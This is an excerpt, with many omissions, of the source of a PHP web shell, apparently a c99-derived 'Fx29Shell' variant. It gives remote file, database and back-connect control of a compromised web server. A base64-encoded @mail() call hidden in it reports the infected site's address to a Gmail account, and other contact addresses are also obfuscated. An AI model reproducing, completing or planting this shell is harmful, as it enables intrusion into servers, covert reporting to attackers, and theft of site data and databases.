...
/* Re-coded and modified By vito          */
/* #vito@irc.allnetwork.org             */
/*******************************************/
$sh_id = "dml0bw==";
$sh_ver = "- Rawckerhead";
...
<style type="text/css">
<!--
body,table { font-family:verdana;font-size:11px;color:pink;background-color:Darkviolet; }
table { width:100%; }
table,td { border:1px solid #00FFFF;margin-top:2;margin-bottom:2;padding:5px; }
a { color:lightblue;text-decoration:none; }
a:active { color:#00FF00; }
a:link { color:#5B5BFF; }
a:hover { text-decoration:underline; }
a:visited { color:#CC0099; }
input,select,option { font:8pt tahoma;color:#FF0033;margin:2;border:1px solid #660033; }
textarea { color:#dedbde;font:fixedsys bold;border:1px solid #660033;margin:2; }
...
.barheader,.mainpanel table,td { border:1px solid #330066; }
.mainpanel input,select,option { border:1px solid #330066;margin:0; }
...
.barheader2,input,select,option,input[type="submit"]:hover { background-color:#330066; }
...
$tmpdir = ""; 
$tmpdir_log = "./";
$log_email = "ipays@craxs.co.cc"; //email untuk pengiriman log.
...
dCA9PSAiIikgeyR2aXNpdGNvdW50ID0gMDsgJHZpc2l0b3IgPSAkX1NFUlZFUlsiUkVNT1Ryx0FE
...
IEBtYWlsKCJyZXN1bHR4eHh4eEBnbWFpbC5jb20iLCJGeDI5U2hlbGwgaHR0cDovLyR0YXJnZXQg
...
//PHP Filesystem Functions, FaTaLisTiCz_yx TriCkz
$phpfsaliases = array(
  ...
  if (!$sql_sock) {
    ...
    if (!empty($sql_tbl)) {
      ...
      if ($sql_tbl_act == "browse") {
        ...
        echo "<br><form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#660033 cellPadding=5 width=\"1%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1>";
        echo "<tr>";
     ...
     {
      echo "<br><form method=\"POST\"><TABLE cellSpacing=0 borderColorDark=#660033 cellPadding=5 width=\"100%\" bgcolor=#000000 borderColorLight=#c0c0c0 border=1><tr><td><input type=\"checkbox\" name=\"boxtbl_all\" value=\"1\"></td><td><center><b>Table</b></center></td><td><b>Rows</b></td><td><b>Type</b></td><td><b>Created</b></td><td><b>Modified</b></td><td><b>Size</b></td><td><b>Action</b></td></tr>";
      $i = 0;
      $tsize = $trows = 0;
      while ($row = mysql_fetch_array($result, MYSQL_ASSOC))
      {
   ...
   if (!empty($sql_act)) {
    ...
    if ($sql_act == "serverstatus") {
     ...
     echo "<TABLE cellSpacing=0 cellPadding=0 bgcolor=#000000 borderColorLight=#330066 border=1><td><b>Name</b></td><td><b>Value</b></td></tr>";
    ...
    if ($sql_act == "processes") {
     ...
     echo "<TABLE cellSpacing=0 cellPadding=2 borderColorLight=#330066 border=1><td><b>ID</b></td><td><b>USER</b></td><td><b>HOST</b></td><td><b>DB</b></td><td><b>COMMAND</b></td><td><b>TIME</b></td><td><b>STATE</b></td><td><b>INFO</b></td><td><b>Action</b></td></tr>";
...
if ($act == "feedback") {
  $suppmail = base64_decode("Z2Vua3N0ZXJfZ2VtYmxpZHpAeWFob28uY29t");
  if (!empty($submit)){
...
if ($act == "f") {
  ...
  if ((!is_readable($d.$f) or is_dir($d.$f)) and $ft != "edit") {
    ...
    if ($ft == "info") {
      ...
      if ($fi) {
        ...
        echo "<table border=1 bgcolor=#660033>".
             "<tr><td bgcolor=#660033>".$a0."</td>".
  ...
  elseif ($ft == "code") {
    ...
    echo "<div style=\"border : 0px solid #FF0033; padding: 1em; margin-top: 1em; margin-bottom: 1em; margin-right: 1em; margin-left: 1em; background-color: ".$highlight_background .";\">";
...
if ($act == "about") {
  echo "<center><b>Credits:</b><br>Idea, leading and coding by <b>ipays [CCTeaM]</b><br>Beta-testing and some tips by <b>NukLeoN [AnTiSh@Re tEaM]</b><br>Re-Coding, tricks, and css by <b>FaTaLisTiCz_yx [FeeLCoMz CoMMuNiTy]</b><br><br> Thanks all who report bugs<br>Please report bugs to <a href=\"mailto:feelcomz@gmail.com\">FaTaLisTiCz_yx</a></b>";
}
if ($act == "backc") {
...
<div class=barheader2 colspan=2><font color=yellow>.:[ Re-Coding by vito | #vito #vito @ irc.allnetwork.org | Generated: <?php echo round(getmicrotime()-starttime,4); ?> seconds ]:.</font></div>
